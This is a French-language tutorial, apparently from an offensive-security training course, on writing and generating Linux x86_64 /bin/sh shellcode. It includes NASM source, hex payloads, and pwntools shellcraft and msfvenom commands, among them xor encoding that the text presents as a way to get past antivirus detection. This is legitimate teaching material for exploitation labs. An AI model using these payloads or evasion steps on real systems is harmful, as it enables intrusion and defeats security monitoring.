Outils de codage shell
======================

* * * * *

Nous devrions maintenant pouvoir modifier notre code et le rendre `shellcode`compatible, de sorte qu'il réponde à tous les critères `Shellcoding Requirements`. Cette compréhension est cruciale pour créer nos propres shellcodes et minimiser leur taille, ce qui peut s'avérer très utile lorsqu'il s'agit d'exploitation binaire, en particulier lorsque nous n'avons pas beaucoup de place pour un gros shellcode.

Dans certains autres cas, nous n'aurons peut-être pas besoin d'écrire notre propre shellcode à chaque fois, car un shellcode similaire peut déjà exister, ou nous pouvons utiliser des outils pour générer notre shellcode, afin de ne pas avoir à réinventer la roue.

Nous rencontrerons de nombreux shellcodes courants grâce à l'exploitation binaire, comme un `Reverse Shell`shellcode ou un `/bin/sh`shellcode. Nous pouvons trouver de nombreux shellcodes qui remplissent ces fonctions, que nous pouvons utiliser avec peu ou pas de modifications. Nous pouvons également utiliser des outils pour générer ces deux shellcodes.

`For either of these, we must be sure to use a shellcode that matches our target Operating System and Processor Architecture.`

* * * * *

Shellcode
---------

Avant de continuer avec les outils et les ressources en ligne, essayons de créer notre propre `/bin/sh`shellcode. Pour ce faire, nous pouvons utiliser l' `execve`appel système avec le numéro d'appel système `59`, qui nous permet d'exécuter une application système :

```
dsgsec@htb[/htb]$ man -s 2 execve

int execve(const char *pathname, char *const argv[], char *const envp[]);

```

Comme nous pouvons le voir, l' `execve`appel système accepte 3 arguments. Nous devons exécuter `/bin/sh /bin/sh`, ce qui nous déposerait dans un `sh`shell. Ainsi, notre fonction finale est :

Code : c

```
execve("/bin//sh", ["/bin//sh"], NULL)

```

Nous allons donc définir nos arguments comme suit :

1.  `rax`-> `59`( `execve`numéro d'appel système)
2.  `rdi`-> `['/bin//sh']`(pointeur vers le programme à exécuter)
3.  `rsi`-> `['/bin//sh']`(liste de pointeurs pour les arguments)
4.  `rdx`-> `NULL`(pas de variables d'environnement)

Remarque : Nous avons ajouté un supplément `/`dans «`/bin//sh` » afin que le nombre total de caractères soit de 8, ce qui remplit un registre de 64 bits, afin que nous n'ayons pas à nous soucier de vider le registre au préalable ou de gérer les restes. Toutes les barres obliques supplémentaires sont ignorées sous Linux, c'est donc une astuce pratique pour égaliser le nombre total de caractères en cas de besoin, et elle est beaucoup utilisée dans l'exploitation binaire.

En utilisant les mêmes concepts que nous avons appris pour appeler un appel système, le code assembleur suivant doit exécuter l'appel système dont nous avons besoin :

Code : nasm

```
global _start

section .text
_start:
    mov rax, 59         ; execve syscall number
    push 0              ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push 0              ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    mov rdx, 0          ; set env to NULL
    syscall

```

Comme nous pouvons le voir, nous avons poussé deux chaînes (terminées par NULL) `'/bin//sh'`, puis avons déplacé leurs pointeurs vers `rdi`et `rsi`. Nous devrions savoir maintenant que le code assembleur ci-dessus ne produira pas de shellcode fonctionnel car il contient des octets NULL.

`Try to remove all NULL bytes from the above assembly code to produce a working shellcode.`

Cliquez pour afficher la réponse

Une fois que nous avons corrigé notre code, nous pouvons `shellcoder.py`l'exécuter et avoir un shellcode sans octets NULL :

```
dsgsec@htb[/htb]$ python3 shellcoder.py sh

b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
27 bytes - No NULL bytes

```

Essayez d'exécuter le shellcode ci-dessus avec `loader.py`pour voir s'il fonctionne et nous dépose dans un shell. Essayons maintenant d'obtenir un autre shellcode pour `/bin/sh`, en utilisant les outils de génération de shellcode.

* * * * *

Shells
-----------

Commençons par nos outils habituels, `pwntools`, et utilisons sa `shellcraft`bibliothèque, qui génère un shellcode pour divers `syscalls`. Nous pouvons lister `syscalls`les outils acceptés comme suit :

```
dsgsec@htb[/htb]$ pwn shellcraft -l 'amd64.linux'

...SNIP...
amd64.linux.sh

```

Nous voyons l' `amd64.linux.sh`appel système, qui nous déposerait dans un shell comme notre shellcode ci-dessus. Nous pouvons générer son shellcode comme suit :

```
dsgsec@htb[/htb]$ pwn shellcraft amd64.linux.sh

6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05

```

Notez que ce shellcode n'est pas aussi optimisé et court que notre shellcode. Nous pouvons exécuter le shellcode en ajoutant le `-r`flag :

```
dsgsec@htb[/htb]$ pwn shellcraft amd64.linux.sh -r

$ whoami

root

```

Et cela fonctionne comme prévu. De plus, nous pouvons utiliser l' `Python3`interpréteur pour déverrouiller `shellcraft`complètement et utiliser des appels système avancés avec des arguments. Tout d'abord, nous pouvons lister tous les appels système disponibles avec `dir(shellcraft)`, comme suit :

```
dsgsec@htb[/htb]$ python3

>>> from pwn import *
>>> context(os="linux", arch="amd64", log_level="error")
>>> dir(shellcraft)

[...SNIP... 'execve', 'exit', 'exit_group', ... SNIP...]

```

Utilisons l' `execve`appel système comme nous l'avons fait ci-dessus pour déposer un shell, comme suit :

```
>>> syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) # syscall and args
>>> asm(syscall).hex() # print shellcode

'48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'

```

Nous pouvons trouver une liste complète des `x86_64`appels système acceptés et leurs arguments sur [ce lien](https://docs.pwntools.com/en/stable/shellcraft/amd64.html) . Nous pouvons maintenant essayer d'exécuter ce shellcode avec `loader.py`:

```
dsgsec@htb[/htb]$ python3 loader.py '48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'

$ whoami

root

```

Et cela fonctionne comme prévu.

* * * * *

Msfvenom
--------

Essayons `msfvenom`, qui est un autre outil courant que nous pouvons utiliser pour la génération de shellcode. Encore une fois, nous pouvons lister différentes charges utiles disponibles pour `Linux`et `x86_64`avec :

```
dsgsec@htb[/htb]$ msfvenom -l payloads | grep 'linux/x64'

linux/x64/exec                                      Execute an arbitrary command
...SNIP...

```

La `exec`charge utile nous permet d'exécuter une commande que nous spécifions. Passons ' `/bin/sh/`' pour le `CMD`, et testons le shellcode que nous obtenons :

```
dsgsec@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'

No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of hex file: 96 bytes
6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05

```

Notez que ce shellcode n'est pas non plus aussi optimisé et court que notre shellcode. Essayons d'exécuter ce shellcode avec notre `loader.py`script :

```
dsgsec@htb[/htb]$ python3 loader.py '6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05'

$ whoami

root

```

Ce shellcode fonctionne également. Essayez de tester d'autres types d'appels système et de charges utiles dans `shellcraft`et`msfvenom`

* * * * *

Encodage du shellcode
---------------------

Un autre grand avantage de l'utilisation de ces outils est d'encoder nos shellcodes sans écrire manuellement nos encodeurs. L'encodage des shellcodes peut devenir une fonctionnalité pratique pour les systèmes dotés d'un antivirus ou de certaines protections de sécurité. Cependant, il faut noter que les shellcodes codés avec des encodeurs courants peuvent être faciles à détecter.

`msfvenom`Nous pouvons également utiliser pour encoder nos shellcodes. On peut d'abord lister les encodeurs disponibles :

```
dsgsec@htb[/htb]$ msfvenom -l encoders

Framework Encoders [--encoder <value>]
======================================
    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder

<SNIP>

```

Ensuite, nous pouvons en choisir un pour `x64`, comme `x64/xor`, et l'utiliser avec le `-e`drapeau, comme suit :

```
dsgsec@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 87 (iteration=0)
x64/xor chosen with final size 87
Payload size: 87 bytes
Final size of hex file: 174 bytes
4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c

```

Essayons d'exécuter le shellcode encodé pour voir s'il fonctionne :

```
dsgsec@htb[/htb]$ python3 loader.py
'4831c94881e9faffffff488d05efffffff48bbf377c2ea294e325c48315827482df8ffffffe2f4994c9a7361f51d3e9a19ed99414e61147a90aac74a4e32147a9190022a4e325c801fc2bc7e06bbbafc72c2ea294e325c'

$ whoami

root

```

Comme nous pouvons le constater, le shellcode encodé fonctionne également tout en étant un peu moins détectable par les outils de surveillance de la sécurité.

Astuce : Nous pouvons encoder notre shellcode plusieurs fois avec le `-i COUNT`flag, et spécifier le nombre d'itérations souhaité.

Nous voyons que le shellcode codé est toujours nettement plus grand que le shellcode non codé puisque l'encodage d'un shellcode ajoute un décodeur intégré pour le décodage à l'exécution. Il peut également coder chaque octet plusieurs fois, ce qui augmente sa taille à chaque itération.

Si nous avions un shellcode personnalisé que nous écrivions, nous pourrions `msfvenom`également l'utiliser pour l'encoder, en écrivant ses octets dans un fichier, puis en le transmettant à `msfvenom`with `-p -`, comme suit :

```
dsgsec@htb[/htb]$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))" > shell.bin
dsgsec@htb[/htb]$ msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 71 (iteration=0)
x64/xor chosen with final size 71
Payload size: 71 bytes
Final size of hex file: 142 bytes
4831c94881e9fcffffff488d05efffffff48bb5a63e4e17d0bac1348315827482df8ffffffe2f4ea58acd0af59e4ac75018d8f5224df7b0d2b6d062f5ce49abc6ce1e17d0bac13

```

Comme nous pouvons le voir, notre charge utile a été codée et est également devenue beaucoup plus volumineuse.

* * * * *

Ressources de shellcode
-----------------------

Enfin, nous pouvons toujours rechercher des ressources en ligne comme [Shell-Storm](http://shell-storm.org/shellcode/) ou [Exploit DB](https://www.exploit-db.com/shellcodes) pour les shellcodes existants.

Par exemple, si nous recherchons dans [Shell-Storm](http://shell-storm.org/shellcode/) un `/bin/sh`shellcode sur `Linux/x86_64`, nous trouverons plusieurs exemples de tailles variables, comme ce [shellcode de 27 octets](http://shell-storm.org/shellcode/files/shellcode-806.php) . Nous pouvons rechercher la même chose dans [Exploit DB et nous trouvons un ](https://www.exploit-db.com/shellcodes)[shellcode de 22 octets](https://www.exploit-db.com/shellcodes/47008) plus optimisé , ce qui peut être utile si notre exploitation binaire ne disposait que d'environ 22 octets d'espace de débordement. Nous pouvons également rechercher des shellcodes codés, qui seront forcément plus gros.

Le shellcode que nous avons écrit ci-dessus fait également 27 octets, il semble donc être un shellcode très optimisé. Avec tout cela, nous devrions être à l'aise avec l'écriture, la génération et l'utilisation de shellcodes.
